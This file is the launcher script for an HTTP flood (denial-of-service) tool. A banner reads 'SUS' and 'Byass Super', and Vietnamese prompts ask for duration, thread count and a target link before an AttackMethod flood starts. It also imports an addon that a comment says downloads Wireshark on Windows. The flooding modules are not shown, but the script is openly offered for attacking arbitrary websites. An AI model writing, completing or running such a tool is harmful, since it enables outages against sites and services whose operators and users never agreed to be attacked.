
import os
import sys

from colorama import Fore

# Changing CWD to the canonical path of the file.
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    os.system("cls" if os.name == "nt" else "clear")

    # Tries to download Wireshark if Windows OS is detected.
    import tools.addons.wireshark
    from tools.method import AttackMethod

except ImportError as err:
    from tools.crash import CriticalError

    CriticalError("Failed to import some packages", err)


if __name__ == "__main__":

    logo = """
  SUS
  """

    CRED2 = "\33[91m"
    print(CRED2 + logo + CRED2)
    print("Byass Super. ")

    try:
        time = int(input(f"{Fore.RED}│   Thoi Gian: {Fore.RESET}"))
        threads = int(input(f"{Fore.RED}│   Thread: {Fore.RESET}"))
        target = str(input(f"{Fore.RED}│   Link: {Fore.RESET}"))

        with AttackMethod(
            duration=time, method_name="HTTP", threads=threads, target=target
        ) as Flood:
            Flood.Start()
    except KeyboardInterrupt:
        print(
            f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.{Fore.RESET}"
        )
        sys.exit(1)
else:
    sys.exit(1)
